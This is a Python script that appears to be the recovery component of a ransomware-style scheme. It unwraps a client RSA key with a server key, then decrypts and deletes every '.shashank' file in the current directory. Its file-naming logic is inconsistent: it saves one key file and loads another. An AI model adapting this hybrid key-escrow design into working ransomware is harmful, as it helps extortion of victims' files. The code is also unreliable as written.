import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization

# Decrypt AES-encrypted file data
def decrypt_file_aes(key, iv_and_ciphertext):
    iv = iv_and_ciphertext[:16]  # Extract the IV
    ciphertext = iv_and_ciphertext[16:]  # Extract the ciphertext

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    # Decrypt the data
    padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    # Unpad the data
    unpadder = sym_padding.PKCS7(algorithms.AES.block_size).unpadder()
    plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()

    return plaintext

# Decrypt AES key using RSA
def decrypt_aes_key_rsa(private_key, encrypted_aes_key):
    decrypted_aes_key = private_key.decrypt(
        encrypted_aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return decrypted_aes_key

# Decrypt a file with the .shashank extension in place
def decrypt_real_file(input_file, private_key):
    # Read the content of the encrypted file
    with open(input_file, 'rb') as f:
        encrypted_data = f.read()

    # The length of the encrypted AES key is determined by the RSA key size
    rsa_key_size = 2048 // 8  # RSA key is 2048 bits (256 bytes)

    # The encrypted AES key is the first part of the data
    encrypted_aes_key = encrypted_data[:rsa_key_size]
    iv_and_ciphertext = encrypted_data[rsa_key_size:]

    # Step 1: Decrypt the AES key using RSA
    aes_key = decrypt_aes_key_rsa(private_key, encrypted_aes_key)

    # Step 2: Decrypt the file data using AES
    decrypted_data = decrypt_file_aes(aes_key, iv_and_ciphertext)

    # Step 3: Write the decrypted data back to a new file without the .shashank extension
    original_file_name = input_file[:-len('.shashank')]  # Remove the .shashank extension
    with open(original_file_name, 'wb') as f:
        f.write(decrypted_data)

    # Optional: Remove the encrypted file
    os.remove(input_file)
    print(f"File '{input_file}' has been decrypted in place and saved as '{original_file_name}'.")

# Decrypt all files in a directory
def decrypt_all_files_in_directory(directory, private_key):
    # Traverse the directory
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.shashank'):  # Target files with .shashank extension
                input_file = os.path.join(root, file)
                decrypt_real_file(input_file, private_key)

def load_private_key():
    # Load the private key from the file
    with open('private_key.pem', 'rb') as f:
        private_key = serialization.load_pem_private_key(
            f.read(),
            password=None,
            backend=default_backend()
        )
    return private_key

def server_load_private_key(file_path):
    with open(file_path, 'rb') as key_file:
        pem_data = key_file.read()
    return serialization.load_pem_private_key(pem_data, password=None, backend=default_backend())

def server_decrypt_file(enc_file_path, private_key):
    with open(enc_file_path, 'rb') as enc_file:
        encrypted_key = enc_file.read(256)  # Assuming 2048-bit RSA key
        iv = enc_file.read(16)
        ciphertext = enc_file.read()

    # Decrypt the AES key with RSA
    aes_key = private_key.decrypt(
        encrypted_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Decrypt the file with AES
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    decrypted_plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    # Remove padding
    padding_length = decrypted_plaintext[-1]
    decrypted_plaintext = decrypted_plaintext[:-padding_length]

    return decrypted_plaintext

def main():
    directory = '.'  # Directory to scan and decrypt all files (current directory by default)

    # step 0:
    # Load the private key from 'server_private_key.pem'
    server_private_key = server_load_private_key('server_private_key.pem')

    # Decrypt the file
    decrypted_data = server_decrypt_file('private_key_encrypted.bin', server_private_key)

    # Save the decrypted data to 'client_private_key.pem'
    with open('client_private_key.pem', 'wb') as f:
        f.write(decrypted_data)

    print("Decrypted data saved to 'client_private_key.pem'")
    # Step 1: Load RSA private key
    private_key = load_private_key()

    # Step 2: Decrypt all files in the directory with .shashank extension
    decrypt_all_files_in_directory(directory, private_key)

    

if __name__ == "__main__":
    main()
